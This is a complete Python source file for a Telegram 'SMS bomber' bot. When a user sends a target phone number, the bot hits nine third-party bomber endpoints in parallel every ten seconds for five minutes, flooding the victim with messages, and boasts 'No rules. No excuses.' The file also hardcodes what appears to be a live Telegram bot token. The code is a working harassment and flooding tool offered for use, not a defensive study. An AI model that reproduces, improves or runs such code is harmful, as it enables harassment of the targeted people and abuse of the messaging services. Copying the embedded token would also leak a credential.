#!/usr/bin/env python3
# DEMON 😈 BOMBER BOT - ULTIMATE CRASH FIX
# RAILWAY READY - SINGLE FILE DEPLOY

import os
import sys
import asyncio
import logging
import aiohttp
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from aiohttp import web

# ==========================================
# 🔥 BAS YAHAN TOKEN DAALO! 🔥
# ==========================================
BOT_TOKEN = "8643322725:AAG45lf0GkMuRLChKNa6K2f2mSRa8tY-FiM"  # @BotFather se lo

# ==========================================
# CONFIGURATION
# ==========================================
BOMB_DURATION = 300  # 5 minutes
CHECK_INTERVAL = 10  # 10 seconds

API_LIST = [
    {"name": "🔥 Ultra Bomber", "url": "https://ultra-bomber-wo5r.onrender.com/bomb", "params": {"key": "admin123"}, "phone_param": "phone"},
    {"name": "💀 Ultra Brutal", "url": "https://ultra-brutal-bomber-njde.onrender.com/bomb", "params": {}, "phone_param": "phone"},
    {"name": "🚀 Part 1", "url": "https://bomber-part-1-kzn0.onrender.com/bomb", "params": {"key": "shuvo"}, "phone_param": "phone"},
    {"name": "⚡ Part 2", "url": "https://brutal-bomber-part-2-6dhd.onrender.com/bomb", "params": {"key": "shuvo"}, "phone_param": "phone"},
    {"name": "💣 Bomber Pro", "url": "https://bomber-pro-r88e.onrender.com/bomb", "params": {"key": "shuvo", "cycles": 10}, "phone_param": "phone"},
    {"name": "🎯 Bomber APIs", "url": "https://bomber-apis-g0sf.onrender.com/bom", "params": {"key": "felix"}, "phone_param": "num"},
    {"name": "🐍 Felix Bomber", "url": "https://felix-bom-irju.onrender.com/bom", "params": {"key": "demo"}, "phone_param": "num"},
    {"name": "🤖 Bomber 3SKM", "url": "https://bomber-3skm.onrender.com/bom", "params": {"key": "felix"}, "phone_param": "num"},
    {"name": "👾 Shuvo Bomber", "url": "https://bomber-by-shuvo.onrender.com/bomb", "params": {}, "phone_param": "phone"}
]

# ==========================================
# LOGGING
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==========================================
# BOMBER ENGINE
# ==========================================
active_sessions = {}

async def bomb_single_api(api, phone):
    try:
        params = api["params"].copy()
        params[api["phone_param"]] = phone
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api["url"], params=params) as resp:
                if resp.status == 200:
                    return {"success": True, "api": api["name"]}
                return {"success": False, "api": api["name"], "error": f"HTTP {resp.status}"}
    except Exception as e:
        return {"success": False, "api": api["name"], "error": str(e)[:30]}

async def continuous_bombing(phone, user_id):
    active_sessions[user_id] = {"phone": phone, "start_time": datetime.now(), "active": True}
    start_time = datetime.now()
    end_time = start_time + timedelta(seconds=BOMB_DURATION)
    cycle_count = 0
    total_success = 0
    
    logger.info(f"[⚡] Starting bombing for {phone}")
    
    while datetime.now() < end_time:
        if not active_sessions.get(user_id, {}).get("active", False):
            break
        
        cycle_count += 1
        tasks = [bomb_single_api(api, phone) for api in API_LIST]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if isinstance(r, dict) and r.get("success"))
        total_success += success
        logger.info(f"[🔄] Cycle {cycle_count}: {success}/{len(API_LIST)} OK")
        await asyncio.sleep(CHECK_INTERVAL)
    
    active_sessions[user_id] = {"active": False}
    return {"total_cycles": cycle_count, "phone": phone, "total_success": total_success}

async def stop_bombing(user_id):
    if user_id in active_sessions:
        active_sessions[user_id]["active"] = False
        return True
    return False

def get_status(user_id):
    if user_id in active_sessions:
        session = active_sessions.get(user_id, {})
        if session.get("active", False):
            elapsed = (datetime.now() - session["start_time"]).seconds
            remaining = max(0, BOMB_DURATION - elapsed)
            return {"active": True, "phone": session["phone"], "remaining": remaining}
    return {"active": False}

# ==========================================
# KEYBOARDS
# ==========================================
main_keyboard = ReplyKeyboardMarkup([
    ["💣 START BOMB", "🛑 STOP"],
    ["📊 STATUS", "ℹ️ HELP"]
], resize_keyboard=True)

# ==========================================
# COMMANDS
# ==========================================
async def start(update: Update, context):
    await update.message.reply_text(
        "🔥 *DEMON 😈 BOMBER BOT*\n\n"
        "📌 *Commands:*\n"
        "`/bomb <phone>` - Start 5-min bomb\n"
        "`/stop` - Stop bombing\n"
        "`/status` - Check status\n\n"
        "*Example:* `/bomb 9876543210`\n\n"
        "😈 *\"No rules. No excuses.\"*",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

async def bomb_command(update: Update, context):
    try:
        args = context.args
        if not args:
            await update.message.reply_text(
                "❌ *Usage:* `/bomb 9876543210`",
                parse_mode='Markdown'
            )
            return
        
        phone = args[0]
        if not phone.isdigit() or len(phone) < 10:
            await update.message.reply_text("❌ *Invalid phone!*", parse_mode='Markdown')
            return
        
        user_id = update.effective_user.id
        status = get_status(user_id)
        if status["active"]:
            await update.message.reply_text(
                f"⚠️ *Already bombing!* Remaining: {status['remaining']}s",
                parse_mode='Markdown'
            )
            return
        
        msg = await update.message.reply_text(
            f"☢️ *BOMBING!* 📱 `{phone}`\n⏱️ 5 minutes auto-stop",
            parse_mode='Markdown'
        )
        
        result = await continuous_bombing(phone, user_id)
        
        await msg.edit_text(
            f"💀 *DONE!* 📱 `{result['phone']}`\n"
            f"🔄 {result['total_cycles']} cycles\n"
            f"💥 {result['total_success']} SMS sent",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Bomb error: {e}")
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

async def stop_command(update: Update, context):
    try:
        user_id = update.effective_user.id
        if await stop_bombing(user_id):
            await update.message.reply_text("🛑 *STOPPED!*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *No active bombing!*", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

async def status_command(update: Update, context):
    try:
        status = get_status(update.effective_user.id)
        if status["active"]:
            await update.message.reply_text(
                f"📊 *ACTIVE*\n📱 `{status['phone']}`\n⏳ {status['remaining']}s left",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("📊 *IDLE*", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

async def handle_message(update: Update, context):
    try:
        text = update.message.text
        
        if text == "💣 START BOMB":
            await update.message.reply_text("📱 *Enter phone number:*", parse_mode='Markdown')
            context.user_data['awaiting_phone'] = True
            
        elif text == "🛑 STOP":
            await stop_command(update, context)
            
        elif text == "📊 STATUS":
            await status_command(update, context)
            
        elif text == "ℹ️ HELP":
            await start(update, context)
            
        elif context.user_data.get('awaiting_phone'):
            phone = text.strip()
            if phone.isdigit() and len(phone) >= 10:
                context.user_data['awaiting_phone'] = False
                user_id = update.effective_user.id
                status = get_status(user_id)
                if status["active"]:
                    await update.message.reply_text("⚠️ *Already bombing!*", parse_mode='Markdown')
                    return
                
                msg = await update.message.reply_text(
                    f"☢️ *BOMBING!* 📱 `{phone}`",
                    parse_mode='Markdown'
                )
                
                result = await continuous_bombing(phone, user_id)
                
                await msg.edit_text(
                    f"💀 *DONE!* 📱 `{result['phone']}`\n"
                    f"🔄 {result['total_cycles']} cycles",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ *Invalid phone!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Message error: {e}")
        await update.message.reply_text(f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

# ==========================================
# WEB SERVER (RAILWAY HEALTHCHECK)
# ==========================================
async def web_server():
    try:
        async def health(request):
            return web.Response(text="OK", status=200)
        
        app = web.Application()
        app.router.add_get('/', health)
        app.router.add_get('/health', health)
        
        port = int(os.environ.get("PORT", 8080))
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host="0.0.0.0", port=port)
        await site.start()
        logger.info(f"[🌐] Web server on port {port}")
        
        # Keep alive
        while True:
            await asyncio.sleep(60)
    except Exception as e:
        logger.error(f"Web server error: {e}")

# ==========================================
# MAIN
# ==========================================
async def main():
    try:
        # Create bot
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("bomb", bomb_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Start bot
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        
        logger.info("[⚡] DEMON 😈 BOT IS ALIVE!")
        
        # Run web server
        await asyncio.gather(
            web_server(),
            asyncio.Event().wait()
        )
    except Exception as e:
        logger.error(f"[❌] Main error: {e}")
        raise

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("[🛑] Shutting down...")
    except Exception as e:
        logger.error(f"[💀] Fatal: {e}")
        sys.exit(1)
